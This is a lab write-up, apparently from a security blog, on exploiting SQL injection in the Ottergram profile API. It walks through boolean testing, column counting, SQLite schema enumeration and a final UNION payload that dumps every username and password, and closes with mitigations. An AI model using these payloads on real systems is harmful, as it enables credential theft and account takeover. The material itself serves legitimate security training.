---
title: "SQL Injection – UNION-Based Credential Extraction via Profile API | Ottergram"
date: 2026-05-02 20:00:00 +0530
categories: [Web Security, SQL Injection]
tags: [sqli, union-based, sqlite, api-testing, burp-suite, authentication-bypass, data-exfiltration]
platform: Ottergram
author: Shivansh Sharma
image:
  path: /assets/images/posts/ottergram-sqli.webp
  alt: UNION-based SQL Injection in profile API
---

## Overview

This lab demonstrates how a seemingly harmless profile API endpoint can be exploited using **UNION-based SQL Injection** to extract sensitive user data.

By chaining multiple SQLi techniques, it was possible to move from basic input testing to full database enumeration and credential dumping.

---

## Objective

Identify and exploit a SQL Injection vulnerability in a profile API endpoint to extract sensitive data from the backend database.

---

## Reconnaissance

After registering a standard user account, the application was explored using **Burp Suite**.

While browsing user profiles, the following API endpoint was observed:

```http
GET /api/profile/admin HTTP/2
Authorization: Bearer <JWT>
```

The username was directly embedded in the URL path, making it a strong candidate for injection testing.

---

## Initial SQL Injection Testing

A boolean-based test confirmed injection:

```http
GET /api/profile/admin' AND 1=1-- -
```

Normal response returned.

```http
GET /api/profile/admin' AND 1=2-- -
```

Returned:

```
404 Not Found
```

This confirmed that the backend query was evaluating injected conditions.

---

## Determining Column Count

To perform UNION-based extraction, the number of columns was identified using `ORDER BY`:

```http
GET /api/profile/admin' ORDER BY 7-- -
```

Successful.

```http
GET /api/profile/admin' ORDER BY 8-- -
```

Failed.

**Conclusion:** The query contains **7 columns**.

---

## Confirming UNION Injection

```http
GET /api/profile/admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

Response:

```json
{
  "user": {
    "id": null,
    "username": null,
    "email": null,
    "full_name": null,
    "bio": null,
    "profile_picture": null,
    "role": null
  }
}
```

The application reflected UNION results directly.

---

## Identifying the Database

Database fingerprinting confirmed **SQLite**:

```http
GET /api/profile/admin' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL,NULL,NULL-- -
```

---

## Column Mapping

To map database columns to JSON fields:

```http
GET /api/profile/admin' AND 1=2 UNION SELECT 'A','B','C','D','E','F','G'-- -
```

Response:

```json
{
  "user": {
    "id": "A",
    "username": "B",
    "email": "C",
    "full_name": "D",
    "bio": "E",
    "profile_picture": "F",
    "role": "G"
  }
}
```

| Column | Field           |
|--------|-----------------|
| 1      | id              |
| 2      | username        |
| 3      | email           |
| 4      | full_name       |
| 5      | bio             |
| 6      | profile_picture |
| 7      | role            |

---

## Enumerating Tables

SQLite schema enumeration via `sqlite_master`:

```http
GET /api/profile/admin' AND 1=2 UNION SELECT NULL,group_concat(name,','),NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'-- -
```

Response:

```
users,sqlite_sequence,posts,likes,comments
```

---

## Extracting Table Schema

```http
GET /api/profile/admin' AND 1=2 UNION SELECT NULL,sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='users'-- -
```

Key fields identified:

- `username`
- `email`
- `password`
- `role`

---

## Credential Extraction

```http
GET /api/profile/admin' AND 1=2 UNION SELECT NULL,group_concat(username||':'||password,' | '),NULL,NULL,NULL,NULL,NULL FROM users-- -
```

This returned all stored credentials.

---

## Proof of Exploitation

- Successfully enumerated database structure
- Extracted schema from `sqlite_master`
- Dumped all user credentials
- Retrieved sensitive authentication data

---

## Impact

This vulnerability allows:

- Full database enumeration
- Credential disclosure
- Account takeover
- Privilege escalation

In real-world applications, this could lead to **complete system compromise**.

---

## Root Cause

The application likely used a query similar to:

```sql
SELECT * FROM users WHERE username = '$input'
```

User input was directly embedded without sanitization.

---

## Mitigation

### 1. Parameterized Queries

```sql
SELECT * FROM users WHERE username = ?
```

### 2. Input Validation

Restrict dangerous input:

- `'`
- `--`
- `UNION`
- SQL keywords

### 3. Least Privilege

Limit database user permissions.

### 4. Error Handling

Avoid exposing backend query behavior.

---

## Real-World Insight

APIs are often assumed to be safer than traditional web endpoints, but they frequently expose structured data directly.

When SQL Injection exists in APIs:

- Data extraction becomes easier due to predictable JSON responses
- Attackers can map database structure faster
- Automation becomes trivial

---

## Key Takeaways

- Boolean-based SQLi is a powerful entry point
- Column count is critical for UNION exploitation
- `AND 1=2` is useful to suppress legitimate results
- SQLite metadata (`sqlite_master`) enables full schema enumeration
- UNION-based SQLi can lead to complete data exfiltration

---

## Conclusion

This lab highlights how a single vulnerable API endpoint can expose an entire database.

By systematically applying SQL injection techniques, it was possible to escalate from basic testing to full credential extraction.

Even modern API-driven applications remain highly vulnerable when secure coding practices are not followed.